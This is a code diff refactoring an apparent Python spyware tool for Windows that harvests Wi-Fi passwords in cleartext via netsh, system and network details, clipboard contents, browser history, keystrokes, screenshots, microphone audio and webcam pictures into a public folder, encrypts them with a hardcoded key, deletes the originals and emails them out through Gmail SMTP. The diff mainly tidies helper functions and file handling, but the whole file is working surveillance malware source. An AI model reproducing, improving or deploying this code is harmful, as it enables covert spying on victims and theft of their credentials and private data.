@@ -1,6 +1,6 @@
 import subprocess, socket, win32clipboard, os, re, smtplib, \
         logging, pathlib, json, time, cv2, sounddevice, shutil
-from requests import get
+import requests
 import browserhistory as bh
 from multiprocessing import Process
 from pynput.keyboard import Key, Listener
@@ -55,6 +55,21 @@ def webcam(file_path):
     cam.release
     cv2.destroyAllWindows
 
+def email_base(name, email_address):
+    name['From'] = email_address
+    name['To'] =  email_address
+    name['Subject'] = 'Success!!!'
+    body = 'Mission is completed'
+    name.attach(MIMEText(body, 'plain'))
+    return name
+
+def smtp_handler(email_address, password, name):
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(email_address, password)
+    s.sendmail(email_address, email_address, name.as_string())
+    s.quit()
+
 # Email sending function #
 def send_email(path): 
     regex = re.compile(r'.+\.xml$')
@@ -64,16 +79,12 @@ def send_email(path):
     regex5 = re.compile(r'.+\.wav$')
 
     email_address = ''                      #<--- Enter your email address
-    password = ''                           #<--- Enter email password here
-
+    password = ''                           #<--- Enter email password 
+    
     msg = MIMEMultipart()
-    msg['From'] = email_address
-    msg['To'] =  email_address
-    msg['Subject'] = 'Success!!!'
-    body = 'Mission is completed'
-    msg.attach(MIMEText(body, 'plain'))
-    exclude = set(['Screenshots', 'WebcamPics'])
+    email_base(msg, email_address)
 
+    exclude = set(['Screenshots', 'WebcamPics'])
     for dirpath, dirnames, filenames in os.walk(path, topdown=True):
         dirnames[:] = [d for d in dirnames if d not in exclude]
         for file in filenames:
@@ -90,11 +101,7 @@ def send_email(path):
 
             elif regex5.match(file):
                 msg_alt = MIMEMultipart()
-                msg_alt['From'] = email_address
-                msg_alt['To'] = email_address
-                msg_alt['Subject'] = 'Success'
-                msg_alt.attach(MIMEText(body, 'plain'))
-
+                email_base(msg_alt, email_address)
                 p = MIMEBase('application', "octet-stream")
                 with open(path + '\\' + file, 'rb') as attachment:
                     p.set_payload(attachment.read())
@@ -103,85 +110,68 @@ def send_email(path):
                                 'filename = {}'.format(file))
                 msg_alt.attach(p)
 
-                s = smtplib.SMTP('smtp.gmail.com', 587)
-                s.starttls()
-                s.login(email_address, password)
-                s.sendmail(email_address, email_address, msg_alt.as_string())
-                s.quit()
+                smtp_handler(email_address, password, msg_alt)
 
             else:
                 pass
 
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.starttls()
-    s.login(email_address, password)
-    s.sendmail(email_address, email_address, msg.as_string())
-    s.quit()
+    smtp_handler(email_address, password, msg)
 
 def main():
     pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
     file_path = 'C:\\Users\\Public\\Logs\\'
 
 ##### Retrieve Network/Wifi informaton for the network_wifi file ################################################################
-    network_wifi = open(file_path + 'network_wifi.txt', 'a')
-    try:
-        commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', 
-                                    'folder=C:\\Users\\Public\\Logs\\', 'key=clear', 
-                                    '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 
-                                    'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'], 
-                                    stdout=network_wifi, stderr=network_wifi, shell=True)
-        outs, errs = commands.communicate(timeout=60)
+    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
+        try:
+            commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', 
+                                        'folder=C:\\Users\\Public\\Logs\\', 'key=clear', 
+                                        '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 
+                                        'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'], 
+                                        stdout=network_wifi, stderr=network_wifi, shell=True)
+            outs, errs = commands.communicate(timeout=60)
 
-    except subprocess.TimeoutExpired:
-        commands.kill()
-        out, errs = commands.communicate()
-
-    network_wifi.close()
+        except subprocess.TimeoutExpired:
+            commands.kill()
+            out, errs = commands.communicate()
 
 ##### Retrieve system information for the system_info file ######################################################################
     hostname = socket.gethostname()
     IPAddr = socket.gethostbyname(hostname)
 
-    system_info = open(file_path + 'system_info.txt', 'a')
-    public_ip = get('https://api.ipify.org').text
-    system_info.write('Public IP Address: ' + public_ip + '\n' \
-                      + 'Private IP Address: ' + IPAddr + '\n')
-    try:
-        get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], 
-                        stdout=system_info, stderr=system_info, shell=True)
-        outs, errs = get_sysinfo.communicate(timeout=15)
+    with open(file_path + 'system_info.txt', 'a') as system_info:
+        try:
+            public_ip = requests.get('https://api.ipify.org').text
+        except requests.ConnectionError:
+            public_ip = '* Ipify connection failed *'
+            pass
 
-    except subprocess.TimeoutExpired:
-        get_sysinfo.kill()
-        outs, errs = get_sysinfo.communicate()
+        system_info.write('Public IP Address: ' + public_ip + '\n' \
+                          + 'Private IP Address: ' + IPAddr + '\n')
+        try:
+            get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], 
+                            stdout=system_info, stderr=system_info, shell=True)
+            outs, errs = get_sysinfo.communicate(timeout=15)
 
-    system_info.close()
+        except subprocess.TimeoutExpired:
+            get_sysinfo.kill()
+            outs, errs = get_sysinfo.communicate()
 
 ##### Copy the clipboard ########################################################################################################
-    clipboard_info = open(file_path + 'clipboard_info.txt', 'a')
-    try:
-        win32clipboard.OpenClipboard()
-        pasted_data = win32clipboard.GetClipboardData()
-        win32clipboard.CloseClipboard()
+    win32clipboard.OpenClipboard()
+    pasted_data = win32clipboard.GetClipboardData()
+    win32clipboard.CloseClipboard()
+    with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
         clipboard_info.write('Clipboard Data: \n' + pasted_data)
-        clipboard_info.close()
-    except:
-        clipboard_info.close()
-        pass
 
 ##### Get the browsing history ##################################################################################################
-    browser_txt = open(file_path + 'browser.txt', 'a')
-    try:
-        browser_history = []
-        bh_user = bh.get_username()
-        db_path =  bh.get_database_paths()
-        hist = bh.get_browserhistory()
-        browser_history.extend((bh_user, db_path, hist))
+    browser_history = []
+    bh_user = bh.get_username()
+    db_path = bh.get_database_paths()
+    hist = bh.get_browserhistory()
+    browser_history.extend((bh_user, db_path, hist))
+    with open(file_path + 'browser.txt', 'a') as browser_txt:
         browser_txt.write(json.dumps(browser_history))
-        browser_txt.close()
-    except:
-        browser_txt.close()
-        pass
 
 ##### Using multiprocess module to log keystrokes, get screenshots, ############################################################ 
     # record microphone, as well as webcam picures #
@@ -212,13 +202,11 @@ def main():
     key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='
 
     for file in files:
-        plain_text = open(file_path + file, 'rb')
-        data = plain_text.read()
+        with open(file_path + file, 'rb') as plain_text:
+            data = plain_text.read()
         encrypted = Fernet(key).encrypt(data)
-        hidden_data = open(file_path + 'e_' + file, 'ab')
-        hidden_data.write(encrypted)
-        plain_text.close()
-        hidden_data.close()
+        with open(file_path + 'e_' + file, 'ab') as hidden_data:
+            hidden_data.write(encrypted)
         os.remove(file_path + file)
 
 ##### Send encrypted files to email account #####################################################################################
@@ -244,3 +232,4 @@ if __name__ == '__main__':
         logging.basicConfig(level=logging.DEBUG, \
                             filename='C:/Users/Public/Logs/error_log.txt')
         logging.exception('* Error Ocurred: {} *'.format(ex))
+        pass
